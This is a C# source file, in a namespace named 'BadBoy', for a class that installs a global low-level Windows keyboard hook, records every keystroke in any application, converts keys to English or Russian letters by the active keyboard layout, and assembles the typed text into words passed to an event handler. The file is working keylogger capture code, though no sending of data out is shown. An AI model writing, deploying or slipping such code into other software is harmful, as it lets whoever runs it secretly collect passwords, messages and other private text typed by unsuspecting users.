using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Globalization;

namespace BadBoy
{
   class C_KbController
   {
      public delegate void WordAction(string value);
      public static event WordAction OnNewWord;

      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 0x0100;
      private const int WM_KEYUP = 0x0101;

      //keycodes
      public const int VK_BACK     = 0x08;
      public const int VK_SHIFT    = 0x10;
      public const int VK_LSHIFT   = 0xA0;
      public const int VK_RSHIFT   = 0xA1;
      public const int VK_CAPITAL  = 0x14;
      public const int VK_SPACE    = 0x20;
      public const int VK_RETURN   = 0x0D;
      public const int VK_CONTROL  = 0x11;
      public const int VK_LCONTROL = 0xA2;
      public const int VK_RCONTROL = 0xA3;
      public const int VK_MENU     = 0x12;
      public const int VK_LMENU    = 0xA4;
      public const int VK_RMENU    = 0xA5;

      private static LowLevelKeyboardProc _proc = HookCallback;
      private static IntPtr _hookID = IntPtr.Zero;

      private static bool[] bKeyStates = new bool[256];
      private static string sCurrentWord = "";

      public static bool HookKeyboard()
      {
         _hookID = SetHook(_proc);
         return _hookID != IntPtr.Zero;
      }

      public static bool UnhookKeyboard()
      {
         if (_hookID == IntPtr.Zero) return false;

         bool result = UnhookWindowsHookEx(_hookID);
         _hookID = IntPtr.Zero;

         return result;
      }

      private static void HandleKey(int vkCode)
      {
         char c = GetKeyboardLetter(vkCode);

         switch (c)
         {
            case (char)VK_BACK:
            {
               if (sCurrentWord.Equals("")) return;
               if(bKeyStates[VK_CONTROL] || bKeyStates[VK_LCONTROL] ||
                     bKeyStates[VK_RCONTROL])
               {
                  sCurrentWord = "";
                  return;
               }

               sCurrentWord = sCurrentWord.Substring(0, sCurrentWord.Length - 1);
               return;
            }

            case (char)VK_CONTROL:
            case (char)VK_LCONTROL:
            case (char)VK_RCONTROL:
            case (char)VK_MENU:
            case (char)VK_LMENU:
            case (char)VK_RMENU:
            {
               return;
            }

            case (char)VK_RETURN:
            case (char)VK_SPACE:
            {
               if (sCurrentWord.Equals("")) return;

               OnNewWord(sCurrentWord);

               sCurrentWord = "";
               return;
            }

            case (char)VK_SHIFT:
            case (char)VK_LSHIFT:
            case (char)VK_RSHIFT:
            {
               return;
            }
         }

         if (!Regex.IsMatch(c.ToString(), "[A-Za-zА-Яа-яЁё\\s$]"))
         {
            return;
         }

         sCurrentWord += c;
      }

      private static IntPtr SetHook(LowLevelKeyboardProc proc)
      {
         using (Process curProcess = Process.GetCurrentProcess())
         {
            using (ProcessModule curModule = curProcess.MainModule)
            {
               return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                   GetModuleHandle(curModule.ModuleName), 0);
            }
         }
      }

      private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

      private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
      {

         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
            int vkCode = Marshal.ReadInt32(lParam);
            bKeyStates[vkCode] = true;
            HandleKey(vkCode);
         }

         if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
         {
            int vkCode = Marshal.ReadInt32(lParam);
            bKeyStates[vkCode] = false;
         }

         return CallNextHookEx(_hookID, nCode, wParam, lParam);
      }

      private static CultureInfo GetCurrentKeyboardLayout()
      {
         try
         {
            IntPtr foregroundWindow = GetForegroundWindow();
            uint foregroundProcess = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
            int keyboardLayout = GetKeyboardLayout(foregroundProcess).ToInt32() & 0xFFFF;
            return new CultureInfo(keyboardLayout);
         }
         catch (Exception)
         {
            return new CultureInfo(1033); // Assume English if something went wrong.
         }

      }

      private static char GetKeyboardLetter(int vk)
      {
         int iLayoutId = GetCurrentKeyboardLayout().KeyboardLayoutId;

         char cLetter = VkToLetter(vk);

         if (iLayoutId == 1049)
         {
            cLetter = EngToRussian(cLetter);
         }

         if (!bKeyStates[VK_SHIFT] && !bKeyStates[VK_LSHIFT] && !bKeyStates[VK_RSHIFT]
            && GetKeyState(VK_CAPITAL) == 0)
         {
            cLetter = char.ToLower(cLetter);
         }

         return cLetter;
      }

      private static int LetterToVk(char letter)
      {
         return (int)(char.ToUpper(letter) & 0xFF);
      }

      private static char VkToLetter(int vk)
      {
         return (char)vk;
      }

      private static char EngToRussian(char letter)
      {
         letter = char.ToUpper(letter);

         //Console.WriteLine(Convert.ToInt32(letter));

         switch (letter)
         {
            case 'Q': return 'Й';
            case 'W': return 'Ц';
            case 'E': return 'У';
            case 'R': return 'К';
            case 'T': return 'Е';
            case 'Y': return 'Н';
            case 'U': return 'Г';
            case 'I': return 'Ш';
            case 'O': return 'Щ';
            case 'P': return 'З';
            case (char)219: return 'Х';
            case (char)221: return 'Ъ';
            case 'A': return 'Ф';
            case 'S': return 'Ы';
            case 'D': return 'В';
            case 'F': return 'А';
            case 'G': return 'П';
            case 'H': return 'Р';
            case 'J': return 'О';
            case 'K': return 'Л';
            case 'L': return 'Д';
            case (char)186: return 'Ж';
            case (char)222: return 'Э';
            case 'Z': return 'Я';
            case 'X': return 'Ч';
            case 'C': return 'С';
            case 'V': return 'М';
            case 'B': return 'И';
            case 'N': return 'Т';
            case 'M': return 'Ь';
            case (char)188: return 'Б';
            case (char)190: return 'Ю';
            case '/': return '.';
            case (char)192: return 'Ё';
         }

         return letter;
      }

      [DllImport("kernel32.dll")]
      private static extern IntPtr GetModuleHandle(string lpModuleName);

      [DllImport("user32.dll")]
      private static extern IntPtr SetWindowsHookEx(int idHook,
          LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool UnhookWindowsHookEx(IntPtr hhk);

      [DllImport("user32.dll")]
      private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
          IntPtr wParam, IntPtr lParam);
      
      [DllImport("user32.dll")]
      private static extern short GetAsyncKeyState(int vKey);

      [DllImport("user32.dll")]
      private static extern short GetKeyState(int vKey);

      [DllImport("user32.dll")]
      private static extern IntPtr GetForegroundWindow();

      [DllImport("user32.dll")]
      private static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr proccess);

      [DllImport("user32.dll")]
      private static extern IntPtr GetKeyboardLayout(uint thread);
   }
}
